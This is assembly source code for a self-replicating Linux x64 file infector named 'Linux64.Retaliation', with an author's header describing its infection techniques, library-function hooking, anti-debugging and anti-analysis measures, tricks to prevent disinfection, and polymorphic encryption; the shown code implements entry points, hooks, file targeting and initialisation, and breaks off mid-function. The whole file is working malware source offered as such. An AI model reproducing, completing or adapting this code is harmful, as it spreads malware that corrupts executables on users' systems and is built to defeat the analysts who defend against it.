%if 0

	Linux64.Retaliation - A Linux x64 Infector by JPanic 2014.

	(see retal-poly-code.inc for poly engine source).

	To Build:	nasm -o retaliation.o -f elf64 retaliation.asm -l retaliation.lst -Ox
			ld retaliation.o -o retaliation


	This virus is written for all you people who never gave a fuck.
	To the few that did.. I'm Sorry.

	This is my first x64 asm project and my first real Linux virus -
	Much love goes to Herm1t who answered all my Linux questions.

	The virus is large - about 22kb. Infected file may grow by as much
	as 60kb - depending on the decryptor size and the number of layers.

	The virus is extrememly slow to run - it may be made faster by disabling
	features below.

	FEATURES:

	Infection Methods -
		Executable - 	PT_NOTE Phdr is changed to PT_LOAD, virus is
				appended, e_entry is changed.

		Prelink Executable - In the case of executables processed by
				'prelink' tool - PT_NOTE is changed to PT_LOAD,
				a new nameless Shdr is created for the virus,
				'.gnu.prelink_undo' section is updated. Thus,
				the virus can survive a 'prelink -u' (undo).

		Relocatables -	Relocatable (object) files are infected too.
				The decryptor is inserted in '.text', the
				encrypted virus body in '.data' and some
				variables for the decryptor in '.bss'. Execution
				is hooked by redirecting random 'FUNCTION' type
				symbol to virus decryptor. Thus an
				infected executable can be created with the
				virus in the middle of the file by linking an
				infected relocatable.

	Infection Vectors -	The virus is both direct-action and per-process
			resident. Upon execution the virus first goes for
			certain files in /bin and /usr/bin. Then all of '.' and
			then randomly /bin or /usr/bin. Since infection is set,
			a 'timeout' value of 5-seconds is set. Upon timeout the
			direct-action infection process ceases and control is
			returned to the host. See section on 'hooks' for per-
			process residency.

	Hooks -		Certain library functions are hooked in .got (global
			offset table) - 13 in all: __lxstat64, __openat_2,
			__xstat64, __lxstat, __xstat, fopen, fopen64, open,
			open64, bfd_openr, execve,  signal and sigaction. First
			11 functions are hooked to catch files to infect. Last
			two (signal and sigaction) are to stop the host
			replacing the virus SIGILL and SIGTRAP handlers.


	EBLOCKS - 	The virus is divided into about 250 independent
			'EBLOCKS'. Upon 'BEGIN_EBLOCK' the block is decrypted
			and its code is entered. Upon 'END_EBLOCK' the block is
			re-encrypted. This algorithm is recursive. The virus
			stores the 32-bit seed used to encrypt the EBLOCK and
			reuses it to generate the same decryptor for the poly
			engine when it is time to decrypt.

	Preservation of Infection -	The virus makes some attempts to make
					disinfection of infected executables
					difficult.

		Encrypting '.data.'	- The virus will encrypt the entire
				'.data' section with 128-bit BTEA at infection
				time and decrypt it before returning control to
				the host at run time.

		Patching .text	-	The virus will scan .text for certain 4-
				byte sequences (CMP RAX,-1 and
				PUSH RBP|MOV RBP,RSP) and patch them with
				illegal opcodes. Before returing control to the
				host a SIGILL handler is installed to catch the
				illegal opcode and emulate the original
				instruction.

		Random Decoding Algorithm (RDA) - 15-bit Random Decoding
				Algorithm is used to encrypt data necessary for
				restoring/disinfecting host. The item of data is
				encrypted with random key and a CRC32 of the
				decrypted data is stored. Upon decryption the
				poly engine is called with sequential seeds
				unti the CRC32 matches the decrypted data.

	Anti-Analysis Methods -	The virus makes certain attempts to hamper
			analysis:

		- The Linux installation must be atleast 10 days old.

		- System uptime must be atleast 17 minutes.

		- If PTRACE is detected the virus will either choose to exit
		gracefully or enter an infinite loop of random syscalls.

		- See sections on Goat File Checks, Anti-Debug code.

	Anti Goat File Checks - The virus makes four (4) attempts to avoid
		'goat' files being created to generate samples:

		- Executables less than 180 minutes old are not infected.

		- Files with the same CRC32 of .text, 3 times in a row, will
		cause the virus to 'shutdown' and stop infecting.

		- Files with constant file size of file size increasing/
		decreasing at a constant rate 4 times in a row will also cause
		the virus to 'shutdown' and stop infecting.

		- Files with sequential filenames (filename increasing/
		decreasing by constant amount) 4 times in a row cause the virus
		to 'shutdown' and stop infecting.

	Anti-Debug Code - Several measures are taken to make debugging harder:

		- Anti-Ptrace code.

		- SIGTRAP handler treats 0xCC (INT3) as a 'call' instruction
		with 16-bit displacement. i.e. db 0CCh, dw offset_to_function.

		- SIGTRAP handles treats 0xF1 (BPICE, INT1) as a 'syscall al'
		instruction: i.e. db 0F1h, db syscall_number

		- SIGILL handler treats illegal opcode 0x27 as 'BEGIN_EBLOCK'
		and illegal opcode 0x2F as 'END_EBLOCK'.

		- Several (60+) sub-routines check for their return address
		being patched with a breakpoint (0xCC) or for TF being set or
		for the next 'PUSHF' being patched. In such a case the virus
		'trashes' itself by overwriting itself in memory with random
		data.

		- The above mentioned check is used as part of the key for
		EBLOCKS and RDA - so it can't be patched.

	Polymorphic engine:

		- 8/16/32-bit decryptors.
		- Forwards/Backwards.
		- 1 or 2 pointer registers.
		- 16/32/64-bit counter register.
		- inc/dec/add/sub of counter for loop.
		- JNZ/JS/JNS/JNC/JG/JL/JGE/JNO/JC loop types.
		- 99% of x64 integer instructions generated as junk.
		- Junk Memory Reads (.data/.rodata/.bss/stack).
		- Junk Memory Writes (.bss/stack)
		- Recursive Junk Loops/If[Else]/Call Sub constructs.
		- Calls to junk sub-routines may be forwards or backwards.
		- Generation of ~90 Linux x64 syscalls as Junk, including check
		for return of correct error code.

	Activation Routines:

		- The virus displays a message to STDOUT when the infection
		inside the files is 90+ days old and the file is on the machine
		it was originally infected on.

		- The virus also displays 'error' messages on the following
		situations:	- SIGTRAP handler receives a trap not generated
				by the virus.

				- SIGILL handler receives an illegal opcoded
				that is not a part of the virus routines.

				- RDA routine fails to find decryption key (this
				should never happen).
%endif




;- BEGIN CODE

	CPU X64

	DEFAULT REL

	SECTALIGN 1

%define VIRUS_NAME_STRING "<<=- [Linux64.Retaliation V1.0] - Coded by JPanic - Australia 2013/2014 -=>>"

%include "linux64.inc"
%include "elf64.inc"
%include "retal-poly-h.inc"
%include "retaliation.inc"

virus_p_size		EQU	(virus_p_end - virus_start)
virus_m_size		EQU	(virus_bss_end - virus_start)
virus_bss_size		EQU	(virus_bss_end - virus_bss_start)
virus_file_bss_size	EQU	(virus_file_bss_end - virus_bss_start)

VIRUS_ALLOC_SIZE	EQU	(virus_m_size + (256 * 1024))

MALLOC_HANDLE_COUNT	EQU	((MALLOC_HANDLE_LIST_END - MALLOC_HANDLE_LIST)/MALLOC_HANDLE_size)

%define RETAL_MAX_POLY_LAYERS		4

%define	RETAL_UNLINK_RENAME		RETAL_ENABLED	; Replace victim with infect tmp file
%define	RETAL_ANTI_PTRACE1		RETAL_ENABLED	; Use fork/PTRACE_ATTACH to detect PTRACE
%define RETAL_PTRACE_CRAZY		RETAL_ENABLED	; 1/10 chance of infinite random syscalls if ptraced
%define RETAL_DT_CHECKSUM		RETAL_DISABLED	; Calculate new DT_CHECKSUM for victim
%define RETAL_GOAT_CHECK		RETAL_ENABLED	; Check for goat files
%define	RETAL_BREAKPOINT_CHECK		RETAL_ENABLED	; Check for 0xCC breakpoints and TF flag
%define RETAL_INT3_CALLS		RETAL_ENABLED	; Make calls using INT3 (0xCC) + imm16
%define RETAL_BP_SYSCALLS		RETAL_ENABLED	; Make syscalls using BPICE (0xF1) + al
%define RETAL_EBLOCKS			RETAL_ENABLED	; Use polymorphic EBLOCKS
%define RETAL_EBLOCK_OPCODE		RETAL_ENABLED	; Use invalid opcode to enter/exit EBLOCK
%define RETAL_PATCH_EXE_TEXT		RETAL_ENABLED	; Patch executable .text with invalid opcodes
%define RETAL_BTEA_DATA			RETAL_ENABLED	; BTEA Encrypt host .data
%define RETAL_HOOK_SIGNAL		RETAL_ENABLED	; Hook signal, sigaction
%define RETAL_POLY_DEBUG		RETAL_DISABLED	; Print poly engine debug strings
%define RETAL_POLY_DEBUG_RDI_R13	RETAL_DISABLED	; Print rdi, r13 during poly engine execution
%define RETAL_POLY_DUMP_ENCRYPT		RETAL_DISABLED	; Dump encryptor to disk when debugging poly engine
%define RETAL_VIRUS_DEBUG		RETAL_DISABLED	; Print virus debug strings

%define RETAL_DISABLE_FOR_DEADLY	RETAL_DISABLED
%define	RETAL_ENABLE_FOR_DEADLY		RETAL_ENABLED

%define RETAL_TEST_DIR		"/goats/"	; Define test directory

%define MIN_VICTIM_SIZE		2048
%define MIN_VICTIM_SIZE_EXE	8192
%define	MAX_VICTIM_SIZE		(8 * 1024 * 1024)

%define P_MEMSZ_GROW		(16 * 1024)

%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
 %define RETAL_HOOK_COUNT	13	; Number of functions hooked.
%else
 %define RETAL_HOOK_COUNT	11	; Number of functions hooked.
%endif

%define CHECK_NEW_OS_DAYS	DAYS(10)	; Minimum age (in days) of operating
						; system (installation date) for the
						; virus to run.

%define	MIN_UPTIME		MINUITES(17)

%define CHECK_NEW_FILE_HOURS	MINUITES(180)	; Minimum age (in minuites) of an executble
						; file, for it to be infected.

%define ACTIVATION_DAYS		DAYS(90)	; Number of days before virus activation

%define TIMEOUT_SECONDS		5		; max number of seconds for direct action infection

%assign	EBLOCK_COUNT		0	; Count of the number of EBLOCKS
					; (polymorphic encrypted blocks).

%assign EBLOCK_OPCODE_COUNT	0	; Count of EBLOCK's made using invalid opcode.

%assign SYSCALL_COUNT		0	; Count of the number of SYSCALL's made.

%assign	FUNC_COUNT		0	; Count of functions in virus.

%assign	BP_CHECK_COUNT		0	; Count of breakpoint checks for function returns

%assign	INT3_CALL_COUNT		0	; Count of calls made using INT 3

%assign BP_SYSCALL_COUNT	0	; Count of bp_syscall_al's made using BPICE

global _start

;-[begin .data - Encrypted Block Table]---------------------------------------
[section .data]
SECTALIGN 1
EBLOCK_Table:
__SECT__

virus_start:
;;;times 0x1000 db 0
;-[exe_entry]-----------------------------------------------------------------
; exe infection entry point.
ADD_FUNCTION
exe_entry:	call	_pusha
		;  Save entry rsp, address.
		lea	rbx,[.exit]
		call	init
		VIRUS_DEBUG_STRING +exe_entry post init
		BEGIN_EBLOCK_OPCODE
		INT3_CALL activate
		; hook calls in .got.plt
		push	RETAL_HOOK_COUNT
		pop	rcx
		lea	rdi,[g_orig_lxstat64]
		lea	rsi,[exe_lxstat64_target]
		lea	rbp,[lxstat64_entry]
	.hook_loop:
		lodsq
		test	rax,rax
		jz	.no_hook
		push	rbp
		pop	rdx
		xchg	[rax],rdx
		mov	[rdi],rdx
	.no_hook:
		scasq
		add	rbp,(fopen64_entry - fopen_entry)
		loop	.hook_loop
		END_EBLOCK_OPCODE
%if (RETAL_DISABLE_FOR_DEADLY == RETAL_DISABLED) && (RETAL_ENABLE_FOR_DEADLY == RETAL_ENABLED)
		INT3_CALL DA_infect
%endif
	.exit:
		%if RETAL_EBLOCKS == RETAL_ENABLED
		INT3_CALL clear_eblocks
		%endif
		call	_popa
		VIRUS_DEBUG_STRING -exe_entry
		ret

entropy1:			dd	0
entropy2:			dd	0

;-[o_entry]-------------------------------------------------------------------
; .o infection entry point.
ADD_FUNCTION
o_entry:	call	_pusha
		;  Save entry rsp, address.
		lea	rbx,[.exit]
		; Init, Infect
		;
		call	init
%if (RETAL_DISABLE_FOR_DEADLY == RETAL_DISABLED) && (RETAL_ENABLE_FOR_DEADLY == RETAL_ENABLED)
		inc	edi
		INT3_CALL DA_infect
%else
		call	.dir1
			db	RETAL_TEST_DIR,0
	.dir1:	pop	rdi
		INT3_CALL infect_dir
%endif
		;  Done.
		jmp	_terminate
	.exit:	call	_popa
		ret

;-[check_ld]------------------------------------------------------------------
; g_is_ld = 1 if we are 'ld' or 'ld.*'
%if 0
ADD_FUNCTION
check_ld:	BEGIN_EBLOCK_OPCODE
		call	_pusha
		and	dword [g_is_ld],0
		call	.skip1
			db "/proc/self/exe",0
	.skip1:	pop	rdi
		lea	rsi,[g_outputfilename_buf]
		xor	rdx,rdx
		mov	dl,MAX_PATH
		bp_syscall_al 89		; readlink
		END_EBLOCK_OPCODE
		jb	.exit
		BEGIN_EBLOCK_OPCODE
		std
		lea	rdi,[rsi+rax]
		mov	al,'.'
		stosb
		xchg	rdi,rsi
		; find start of filename
		.fname_loop:
			cmp	rsi,rdi
			je	.fname
			lodsb
			cmp	al,'/'
			jne	.fname_loop
		add	rsi,2
	.fname:	cld
		lodsw
		cmp	ax,'ld'
		END_EBLOCK_OPCODE
		jne	.exit
		lodsb
		cmp	al,'.'
		jne	.exit
		inc	dword [g_is_ld]
	.exit:	call	_popa
		ret
%endif
;-[__open_entry]--------------------------------------------------------------
; stat/open/execve functions hooks
;g_rehook_target		dq	0
;g_rehook_function		dq	0
;g_rehook_call			dq	0

ADD_FUNCTION
lxstat64_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for lxstat64()
		push	qword [g_orig_lxstat64]
		push	qword [exe_lxstat64_target]
		lea	rax,[lxstat64_entry]
		mov	byte [g_hook_use_RSI],1
		END_EBLOCK_OPCODE
		jmp	openat2_entry.jopen

ADD_FUNCTION
openat2_entry:	BEGIN_EBLOCK_OPCODE
		push	rax		; setup for __openat_2()
		push	qword [g_orig_openat2]
		push	qword [exe_openat2_target]
		lea	rax,[openat2_entry]
		mov	byte [g_hook_use_RSI],1
		END_EBLOCK_OPCODE
	.jopen:	jmp	xstat64_entry.jopen

ADD_FUNCTION
xstat64_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for xstat64()
		push	qword [g_orig_xstat64]
		push	qword [exe_xstat64_target]
		lea	rax,[xstat64_entry]
		mov	byte [g_hook_use_RSI],1
		END_EBLOCK_OPCODE
	.jopen:	jmp	lxstat_entry.jopen


ADD_FUNCTION
lxstat_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for lxstat()
		push	qword [g_orig_lxstat]
		push	qword [exe_lxstat_target]
		lea	rax,[lxstat_entry]
		mov	byte [g_hook_use_RSI],1
		END_EBLOCK_OPCODE
	.jopen	jmp	xstat_entry.jopen

ADD_FUNCTION
xstat_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for xstat()
		push	qword [g_orig_xstat]
		push	qword [exe_xstat_target]
		lea	rax,[xstat_entry]
		mov	byte [g_hook_use_RSI],1
		END_EBLOCK_OPCODE
	.jopen:	jmp	fopen_entry.jopen

ADD_FUNCTION
fopen_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for fopen()
		push	qword [g_orig_fopen]
		push	qword [exe_fopen_target]
		lea	rax,[fopen_entry]
		mov	byte [g_hook_use_RSI],0
		END_EBLOCK_OPCODE
	.jopen:	jmp	fopen64_entry.jopen

ADD_FUNCTION
fopen64_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for fopen64()
		push	qword [g_orig_fopen64]
		push	qword [exe_fopen64_target]
		lea	rax,[fopen64_entry]
		mov	byte [g_hook_use_RSI],0
		END_EBLOCK_OPCODE
	.jopen: jmp	open_entry.jopen

ADD_FUNCTION
open_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for open()
		push	qword [g_orig_open]
		push	qword [exe_open_target]
		lea	rax,[open_entry]
		mov	byte [g_hook_use_RSI],0
		END_EBLOCK_OPCODE
	.jopen: jmp	open64_entry.jopen


ADD_FUNCTION
open64_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for open64()
		push	qword [g_orig_open64]
		push	qword [exe_open64_target]
		lea	rax,[open64_entry]
		mov	byte [g_hook_use_RSI],0
		END_EBLOCK_OPCODE
	.jopen: jmp	bfd_openr_entry.jopen

ADD_FUNCTION
bfd_openr_entry:BEGIN_EBLOCK_OPCODE
		push	rax			; setup for bfd_openr()
		push	qword [g_orig_bfd_openr]
		push	qword [exe_bfd_openr_target]
		lea	rax,[bfd_openr_entry]
		mov	byte [g_hook_use_RSI],0
		END_EBLOCK_OPCODE
	.jopen: jmp	execve_entry.jopen

ADD_FUNCTION
execve_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for execve()
		push	qword [g_orig_execve]
		push	qword [exe_execve_target]
		lea	rax,[execve_entry]
		mov	byte [g_hook_use_RSI],0
		END_EBLOCK_OPCODE

	.jopen:
%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
	jmp	signal_entry.jopen
%else
	jmp	__open_entry
%endif

%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
ADD_FUNCTION
signal_entry:	BEGIN_EBLOCK_OPCODE
		push	rax			; setup for signal()
		push	qword [g_orig_signal]
		push	qword [exe_signal_target]
		lea	rax,[signal_entry]
		mov	byte [g_hook_use_RSI],42
		END_EBLOCK_OPCODE
	.jopen:	jmp	__open_entry

ADD_FUNCTION
sigaction_entry:BEGIN_EBLOCK_OPCODE
		push	rax			; setup for signaction()
		push	qword [g_orig_sigaction]
		push	qword [exe_sigaction_target]
		lea	rax,[sigaction_entry]
		mov	byte [g_hook_use_RSI],43
		END_EBLOCK_OPCODE
%endif

ADD_FUNCTION
__open_entry:	BEGIN_EBLOCK_OPCODE
		pop	qword [g_rehook_target]	; prepare to rehook
		pop	qword [g_rehook_call]
		mov	qword [g_rehook_function],rax
		pop	rax
		call	_pusha			; open handler - infect .o / exe
		cld
		cmp	dword [g_virus_status],VIRUS_INITIALISED
		END_EBLOCK_OPCODE
		jne	.exit
		BEGIN_EBLOCK_OPCODE
		mov	[g_terminate_rsp],rsp
		lea	rax,[.exit]
		mov	[g_terminate_address],rax
	%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
		cmp	byte [g_hook_use_RSI],43
		je	.do_SIGNALa
		cmp	byte [g_hook_use_RSI],42
		jne	.no_SIGNAL
	.do_SIGNALa:
		lea	rsi,[ill_signal_handler]
		cmp	rdi,SIGILL
		je	.do_SIGNAL
		lea	rsi,[trap_signal_handler]
		cmp	rdi,SIGTRAP
		jne	.exit
	.do_SIGNAL:
		cmp	byte [g_hook_use_RSI],42
		je	.set
		xor	rsi,rsi
	.set:	mov	qword [rsp+PUSHA_STACK.rax],rsi
		lea	rax,[.hook_ret]
		mov	[g_rehook_call],rax
		jmp	.exit
	.no_SIGNAL:
	%endif
		cmp	byte [g_hook_use_RSI],0
		je	.no_RSI
		push	rsi
		pop	rdi
	.no_RSI:END_EBLOCK_OPCODE
		; infect executable / relocatable
		INT3_CALL infect_file
	.exit:
		%if RETAL_EBLOCKS == RETAL_ENABLED
			INT3_CALL clear_eblocks
		%endif
		BEGIN_EBLOCK_OPCODE
		call	_popa
		call	qword [g_rehook_call]	; call original function
		push	rax			; rehook
		mov	rax,[g_rehook_target]
		push	qword [g_rehook_function]
		pop	qword [rax]
		pop	rax			; return to caller
		END_EBLOCK_OPCODE
	.hook_ret:
		retn

;-[exe infection data]--------------------------------------------------------
exe_data_start:
%if RETAL_BTEA_DATA == RETAL_ENABLED
exe_data_addr:		dq	0
exe_data_size:		dd	-1
			dd	0	; RDA checksum

exe_btea_dec_key:	dd	0,0,0,0
			dd	0	; RDA checksum
%endif
exe_lxstat64_target:	dq	0
exe_openat2_target:	dq	0
exe_xstat64_target:	dq	0
exe_lxstat_target:	dq	0
exe_xstat_target:	dq	0
exe_fopen_target:	dq	0
exe_fopen64_target:	dq	0
exe_open_target:	dq	0
exe_open64_target:	dq	0
exe_bfd_openr_target:	dq	0
exe_execve_target:	dq	0
%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
exe_signal_target:	dq	0
exe_sigaction_target:	dq	0
%endif

%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
exe_prolog_patch_sum:	dw	0
exe_cmp_rax_patch_sum:	dw	0
			dd	0	; RDA checksum
%endif

exe_host_date:		dq	0
exe_activate_date:	dq	0

exe_bss_addr:		dq	0
exe_bss_size:		dq	0

host_type:		db	'o'

;-[setup_virus_body]----------------------------------------------------------
ADD_FUNCTION
setup_virus_body:
		VIRUS_DEBUG_STRING +setup_virus_body
		BEGIN_EBLOCK_OPCODE
		lea	r15,[g_VirusBody_Handle]
		mov	ebx,VIRUS_ALLOC_SIZE
		INT3_CALL malloc
		push	rax
		pop	rdi
		lea	rsi,[virus_start]
		mov	ecx,virus_p_size/4
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		rep	movsd
		BEGIN_EBLOCK_OPCODE
		mov	ecx,virus_bss_size/4
	.l:	INT3_CALL rand_any
		stosd
		loop	.l
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -setup_virus_body
		ret


;-[build_exe_virus_body]------------------------------------------------------
;
ADD_FUNCTION
build_exe_virus_body:
		VIRUS_DEBUG_STRING +build_exe_virus_body
		call	_pusha
		INT3_CALL setup_virus_body
		BEGIN_EBLOCK_OPCODE
		sub	rdi,(virus_bss_end - exe_data_start)

		%if RETAL_BTEA_DATA == RETAL_ENABLED
		;CHECK_BREAKPOINT
		mov	ecx,[g_data_index]
		INT3_CALL get_section_by_index
		lea	rsi,[rbx+Elf64_Shdr.sh_type]
		lodsd					; sh_type
		cmp	eax,SHT_PROGBITS
	.ti_nz0:jne	_terminate_infection
		lodsq
		cmp	rax,SHF_WRITE|SHF_ALLOC		; sh_flags
		jnz	.ti_nz0
		push	rdi
		movsq					; sh_addr
		lodsq
		movsd					; sh_size
		pop	rsi
		push	12
		pop	rcx
		call	RDA_Encode_CRC
		scasd
		lea	rsi,[g_btea_enc_key]
		push	rdi
		movsq
		movsq
		pop	rsi
		push	16
		pop	rcx
		call	RDA_Encode_CRC
		scasd
		%endif
		lea	rsi,[g_lxstat64_target]
		push	(RETAL_HOOK_COUNT * 2)
		pop	rcx
		rep	movsd
	%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
		push	rdi
		mov	eax,[g_exe_prolog_patch_sum]
		stosd
		pop	rsi
		push	4
		pop	rcx
		call	RDA_Encode_CRC
		scasd
	%endif
		mov	rax,[g_host_date]
		stosq
		INT3_CALL time_null
		add	rax,ACTIVATION_DAYS
		stosq
		xor	rax,rax
		push	rax
		pop	rbp
		cmp	byte [g_bss_has_relocs],0
		jne	.no_bss
		mov	ecx,[g_bss_index]
		jrcxz	.no_bss
		INT3_CALL get_section_by_index
		mov	rax,[rbx+Elf64_Shdr.sh_addr]
		mov	rbp,[rbx+Elf64_Shdr.sh_size]
	.no_bss:stosq				; exe_bss_addr
		xchg	rbp,rax
		stosq				; exe_bss_size
		mov	al,'e'
		stosb
		call	_popa
		END_EBLOCK_OPCODE
		VIRUS_DEBUG_STRING -build_exe_virus_body
		ret

;-[build_o_virus_body]--------------------------------------------------------
ADD_FUNCTION
build_o_virus_body:
		VIRUS_DEBUG_STRING +build_o_virus_body
		call	_pusha
		INT3_CALL setup_virus_body
		sub	rdi,(virus_bss_end - exe_data_size)
		%if RETAL_BTEA_DATA == RETAL_ENABLED
		CHECK_BREAKPOINT
		or	dword [rdi],-1
		lea	rsi,[rdi-8]
		push	12
		pop	rcx
		call	RDA_Encode_CRC
		%endif
		and	qword [rdi - exe_data_size + exe_bss_addr],0
		mov	byte [rdi - exe_data_size + host_type],'o'

		call	_popa
		VIRUS_DEBUG_STRING -build_o_virus_body
		ret

;-[get_file_type]-------------------------------------------------------------
; set g_file_type/al to 'u','o' or 'e' depending on filename at rdi
; take filename checksum for goat check
; get victim directory
ADD_FUNCTION
get_file_type:	VIRUS_DEBUG_STRING +get_file_type
		BEGIN_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		push	rdi
		push	rbx
		; find end of file name
		push	rdi
		pop	rsi
		push	rdi
		pop	rbp
		mov	ecx,MAX_PATH-8
		xor	al,al
		repne	scasb
		mov	ax,'uu'
		jne	.exit
		cmp	word [rdi-3],'.o'	; is .o?
		jne	.fnstart
		mov	ah,'o'
		; find filename start
	.fnstart:
		push	rdi
	.fs_loop:
		dec	rdi
		cmp	rdi,rsi
		je	.fs_start
		cmp	byte [rdi],'/'
		jne	.fs_loop
		inc	rdi
	.fs_start:
		pop	rsi	; rdi = filestart, rsi=end 0
%if RETAL_GOAT_CHECK == RETAL_ENABLED
		; get filename checksum for goat check
		push	rdi
		xor	ebx,ebx
		mov	ecx,ebx
	.checksum_loop:
			mov	cl,[rdi]
			add	ebx,ecx
			inc	rdi
			cmp	rdi,rsi
			jb	.checksum_loop
		mov	[g_cur_fname_sum],ebx
		pop	rdi
%endif
		; check for ld.* or '*' without extension
		; avoid crt*.o
		cmp	ah,'o'
		jne	.fn_exec
		cmp	word [rdi],'cr'
		jne	.is_o
		cmp	byte [rdi+2],'t'
		jne	.is_o
		jmp	.exit
	.fn_exec:
		cmp	word [rdi],'ld'
		jne	.dot_loop
		cmp	byte [rdi+2],'.'	; infect ld.*
		je	.is_exec
	.dot_loop:				; infect files with no extension
		cmp	byte [rdi],'.'
		je	.exit
		inc	rdi
		cmp	rdi,rsi
		jbe	.dot_loop
	.is_exec:
		mov	al,'e'
		jmp	.exit
	.is_o:	mov	al,'o'
	.exit:	mov	[g_file_type],al
		pop	rbx
		pop	rdi
		CHECK_BREAKPOINT
		END_EBLOCK_OPCODE
		ret

;-[init]----------------------------------------------------------------------
; Initialise virus at start up, rbx = return address on terminate.
ADD_FUNCTION
init:		VIRUS_DEBUG_STRING +init
		cld

;	%if RETAL_EBLOCKS == RETAL_ENABLED
;		and	dword [g_EBLOCK_index],0
;	%endif
		CHECK_BREAKPOINT
		and	dword [state_i],0
		; exit if virus already started
		mov	eax,[g_virus_status]
		cmp	eax,VIRUS_INITIALISED
		je	.already
		cmp	eax,VIRUS_TERMINATED
		jne	.do
	.already:
		mov	[rsp],rbx
		jmp	.exit
		; init return address/rsp
	.do:	lea	rax,[rsp+8]
		mov	[g_terminate_rsp],rax
		mov	[g_terminate_address],rbx
		; zero .bss
		lea	rdi,[virus_bss_start]
		mov	ecx,(virus_bss_size / 4)
		call	bzero
		mov	dword [g_virus_status],VIRUS_INITIALISED
		BEGIN_EBLOCK
		; initialisze
		; EXE SIGILL Handler, Decrypt .data
%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
		cmp	byte [host_type],'o'
		je	.nrda1
		lea	rsi,[exe_prolog_patch_sum]
		push	4
		pop	rcx
		call	RDA_Decode
	.nrda1:
%endif
%if (RETAL_PATCH_EXE_TEXT == RETAL_ENABLED) || (RETAL_EBLOCK_OPCODE == RETAL_ENABLED)
		push	1 << (SIGILL - 1)
		pop	rdx
		push	SIGILL
		pop	rdi		; signo
		lea	rax,[ill_signal_handler]
		call	install_signal_handler
%endif
%if RETAL_BTEA_DATA == RETAL_ENABLED
		lea	rsi,[exe_data_addr]
		push	12
		pop	rcx
		call	RDA_Decode
		cmp	dword [rsi+8],-1
		je	.no_exe_data
		push	16
		pop	rcx
		lea	rsi,[exe_btea_dec_key]
		call	RDA_Decode
		call	btea_dec
	.no_exe_data:
%endif
		mov	rdi,[exe_bss_addr]
		test	rdi,rdi
		jz	.no_exe_bss
		mov	rcx,[exe_bss_size]
		jrcxz	.no_exe_bss
		xor	al,al
		rep	stosb
	.no_exe_bss:
		and	dword [state_i],0
		; SIGTRAP Handler
%if RETAL_INT3_CALLS == RETAL_ENABLED || RETAL_BP_SYSCALLS == RETAL_ENABLED
		push	1 << (SIGTRAP - 1)
		pop	rdx
		push	SIGTRAP
		pop	rdi
		lea	rax,[trap_signal_handler]
		call	install_signal_handler
%endif
		; Terminate on PTRACE
%if RETAL_ANTI_PTRACE1 == RETAL_ENABLED
		call	anti_ptrace1
		stc				; re-encrypt child
		call	anti_ptrace1.child
%endif
		INT3_CALL rand_init
		INT3_CALL create_tmp_ext
%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
	.patchl:INT3_CALL rand_any
		mov	[g_exe_prolog_patch_sum],eax
		cmp	[g_exe_cmp_rax_patch_sum],ax
		je	.patchl
%endif
		mov	al,RETAL_MAX_POLY_LAYERS
		INT3_CALL rand_al
		inc	al
		mov	[g_poly_exe_layers],eax
		INT3_CALL check_uptime
		INT3_CALL check_new_os
		lea	rdi,[g_cwd_buf]
		mov	esi,(MAX_PATH+1)
		CHECK_BREAKPOINT
		bp_syscall_al 79		; getcwd
		INT3_CALL time_null
		add	rax,TIMEOUT_SECONDS
		mov	[g_direct_action_timeout],rax
		END_EBLOCK
	.exit:	ret

;-[init_infect]--------------------------------------------------------------
; Initialise per-infection resources. return al = file type 'e'/'o'
ADD_FUNCTION
init_file:	;  Zero .bss
		VIRUS_DEBUG_STRING +init_file
		BEGIN_EBLOCK_OPCODE
		push	rdi
		cld
		lea	rdx,[infect_file.exit]
		mov	[g_terminate_infection_address],rdx
		lea	rax,[rsp+16]
		mov	[g_terminate_infection_rsp],rax
		lea	rdi,[virus_bss_start]
		mov	ecx,(virus_file_bss_size / 4)
		END_EBLOCK_OPCODE
		call	bzero
		BEGIN_EBLOCK_OPCODE
		pop 	rdi
		;
		mov	[g_inputfilename_ptr],rdi
		INT3_CALL get_file_type
		cmp	al,'o'
		je	.is_o
		cmp	al,'e'
	.is_o:	END_EBLOCK_OPCODE
		CHECK_BREAKPOINT
		jne	.exit
		ret
	.exit:	pop	rax
		jmp	rdx

;-[_terminate]---------------------------------------------------------------
; Cleanup and exit virus.
ADD_FUNCTION
_terminate:	mov	dword [g_virus_status],VIRUS_TERMINATED
		;  Clean up files.
		mov	[g_terminate_infection_rsp],rsp
		lea	rax,[.free_mem]
		mov	[g_terminate_infection_address],rax
		jmp	_terminate_infection
		;
		; Free memory.
		;
	.free_mem:
		BEGIN_EBLOCK
		mov	ecx,MALLOC_HANDLE_COUNT
		lea	r15,[MALLOC_HANDLE_LIST]
	.free_loop:	call	free
			add	r15,MALLOC_HANDLE_size
			loop	.free_loop
		;  Restore entry rsp
		lea	rsi,[g_fd_dir]
		call	close
		cmp	dword [g_terminate_chdir],0
		je	.no_chdir
			lea	rdi,[g_cwd_buf]
			_syscall_al 80		; chdir
	.no_chdir:
		mov	rsp,[g_terminate_rsp]
		END_EBLOCK
		jmp	qword [g_terminate_address]

;-[_terminate_infection]------------------------------------------------------
; Terminate infection.
ADD_FUNCTION
_terminate_infection:
		VIRUS_DEBUG_STRING +_terminate_infection
%if RETAL_EBLOCKS == RETAL_ENABLED
		call	clear_eblocks
%endif
		;
		; Copy over victim, set mode/owner/time, delete tmp
		;
		;
		BEGIN_EBLOCK_OPCODE
		mov	rsi,[g_poly_syscall]
